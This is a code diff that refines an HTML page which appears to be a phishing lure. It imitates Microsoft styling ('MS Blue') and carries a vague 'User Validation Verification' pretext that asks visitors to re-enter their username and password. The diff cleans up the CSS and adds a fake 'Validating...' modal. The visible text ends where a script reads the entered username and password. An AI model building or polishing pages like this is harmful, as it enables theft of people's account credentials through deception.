@@ -8,47 +8,42 @@
     <style>
         /* Add CSS for setting the background color to dark grey */
         body {
-            background-color: rgb(255, 255, 255); /* ms style */
-              font-family: "Basic Sans Light SF", sans-serif;
-              font-weight:400;
-              font-size:1rem;
-              line-height:1.5rem;
-              letter-spacing:.2px;
-              letter-spacing:0
+            background-color: rgb(255, 255, 255); /* MS style */
+            font-family: "Basic Sans Light SF", sans-serif;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            letter-spacing: 0.2px;
         }
         form {
-          border: 0;
-          outline: 0;
-          width: 80%;
-          padding: 10px 20px;
+            border: 0;
+            outline: 0;
+            width: 80%;
+            padding: 10px 20px;
         }
-        
         input {
-          border: 0;
-          outline: 0;
-          background: rgb(255,252,205);
-          border-bottom: 1px solid black;
-          width: 50%;
-          padding: 10px 20px;
+            border: 0;
+            outline: 0;
+            background: rgb(255, 252, 205);
+            border-bottom: 1px solid black;
+            width: 50%;
+            padding: 10px 20px;
         }
-        
         /* Style the button */
         button {
             padding: 10px 20px;
-            background-color:  rgb(58, 120, 181); /* MS Blue */
+            background-color: rgb(58, 120, 181); /* MS Blue */
             color: white; /* Text color for the button */
             border: none;
             cursor: pointer;
             border-radius: 30px;
         }
-
         /* Style the button on hover */
         button:hover {
             background-color: #0056b3; /* Darker blue color on hover */
             cursor: pointer;
         }
-
-                /* Styles for the modal background */
+        /* Styles for the modal background */
         .modal-background {
             display: none;
             position: fixed;
@@ -58,8 +53,7 @@
             height: 100%;
             background-color: rgba(0, 0, 0, 0.5);
         }
-
-        /* Styles for the modal content */
+        /* Styles for the first modal content */
         .modal-content {
             position: fixed;
             top: 50%;
@@ -69,59 +63,81 @@
             padding: 20px;
             border-radius: 5px;
             font-family: "Basic Sans Light SF", sans-serif;
-              font-weight:400;
-              font-size:1rem;
-              line-height:1.5rem;
-              letter-spacing:.2px;
-              letter-spacing:0
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            letter-spacing: 0.2px;
+        }
+        /* Styles for the second modal content */
+        .modal-content2 {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            font-family: "Basic Sans Light SF", sans-serif;
+            font-weight: 400;
+            font-size: 1rem;
+            line-height: 1.5rem;
+            letter-spacing: 0.2px;
         }
     </style>
 </head>
 <body>
     <div id="modalContent" class="modal-content">
-        <form id="myForm" onsubmit="completeForm()">
+        <form id="myForm" onsubmit="return completeForm()">
             <h1>User Validation Verification (UVV)</h1>
-            We are committed to ensuring the accuracy of your account information to provide you with the best experience. Before you continue, please take a moment to confirm you information so we can validate what we have on file for your account.<br><br>
+            We are committed to ensuring the accuracy of your account information to provide you with the best experience. Before you continue, please take a moment to confirm your information so we can validate what we have on file for your account.<br><br>
             <input type="text" id="username" placeholder="Username" required><br><br>
             <input type="password" id="password" placeholder="Password" required><br><br>
-            <button type="submit" onclick="showModal()">confirm</button>
+            <button type="submit">Confirm</button>
         </form>
-    </div>div>
+    </div>
 
-<!-- Modal Background -->
-<div id="modalBackground" class="modal-background"></div>
+    <!-- Modal Background -->
+    <div id="modalBackground" class="modal-background"></div>
 
-<!-- Modal Content -->
-<div id="modalContent" class="modal-content">
-    <h2>Validating...</h2>
-    <!-- Add your content here -->
-    <button onclick="hideModal()">Close</button>
-</div>
-
-<script>
-function showModal() {
-    document.getElementById('modalBackground').style.display = 'block';
-    document.getElementById('modalContent').style.display = 'block';
-}
-
-function hideModal() {
-    document.getElementById('modalBackground').style.display = 'none';
-    document.getElementById('modalContent').style.display = 'none';
-}
-
-function completeForm() {
-    // Here, you would typically submit the form to the server
-    // For this example, we'll just simulate a submission delay (2 seconds)
-    setTimeout(function() {
-        // Hide the modal when the form is complete
-        hideModal();
-        // You can also choose to redirect or perform other actions here
-    }, 2000); // 2000 milliseconds = 2 seconds
-}
-</script>
+    <!-- Modal Content 2 (Hidden by default) -->
+    <div id="modalContent2" class="modal-content2">
+        <h2>Validating...</h2>
+        <!-- Add your content here -->
+        <button onclick="hideModal()">Close</button>
+    </div>
 
     <script>
-        document.getElementById("myForm").addEventListener("submit", function(event) {
+        function showModal() {
+            document.getElementById('modalBackground').style.display = 'block';
+            document.getElementById('modalContent').style.display = 'block';
+        }
+
+        function hideModal() {
+            document.getElementById('modalBackground').style.display = 'none';
+            document.getElementById('modalContent2').style.display = 'none';
+        }
+
+        function completeForm() {
+            // Here, you would typically submit the form to the server
+            // For this example, we'll just simulate a submission delay (2 seconds)
+            setTimeout(function () {
+                // Hide the first modal
+                hideModal();
+
+                // Show the second modal
+                document.getElementById('modalContent2').style.display = 'block';
+
+                // You can also choose to redirect or perform other actions here
+            }, 2000); // 2000 milliseconds = 2 seconds
+
+            // Prevent the form from submitting
+            return false;
+        }
+    </script>
+
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function (event) {
             event.preventDefault(); // Prevent the form from submitting by default
             const value = document.getElementById("username").value;
             const value1 = document.getElementById("password").value;
